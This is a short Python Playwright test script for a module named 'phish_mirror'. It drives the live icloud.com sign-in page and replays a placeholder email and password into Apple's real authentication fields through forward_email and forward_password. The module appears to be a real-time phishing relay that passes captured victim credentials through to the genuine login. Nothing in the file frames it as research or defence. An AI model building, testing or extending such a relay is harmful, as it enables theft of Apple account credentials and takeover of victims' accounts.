#!/usr/bin/env python3
"""Directly test the forward_* functions against a live icloud.com sign-in."""
from playwright.sync_api import sync_playwright
import phish_mirror as m

with sync_playwright() as p:
    b = p.chromium.launch(channel='chrome', headless=True)
    ctx = b.new_context(viewport={'width': 1000, 'height': 940})
    apple = ctx.new_page()
    frame = m.open_icloud_sign_in(apple)
    print('frame after open:', (frame.url if frame else None))

    m.forward_email(apple, frame, 'test.example.appleid.com')
    frame = m.apple_auth_frame(apple) or frame
    try:
        val = frame.locator('#account_name_text_field').input_value(timeout=5000)
        print('email field value after forward_email:', repr(val))
    except Exception as e:
        print('email read err:', repr(e))

    m.forward_password(apple, frame, 'hunter2secret')
    frame = m.apple_auth_frame(apple) or frame
    try:
        pval = frame.locator('#password_text_field').input_value(timeout=5000)
        print('password field value after forward_password:', repr(pval))
    except Exception as e:
        print('password read err:', repr(e))

    b.close()
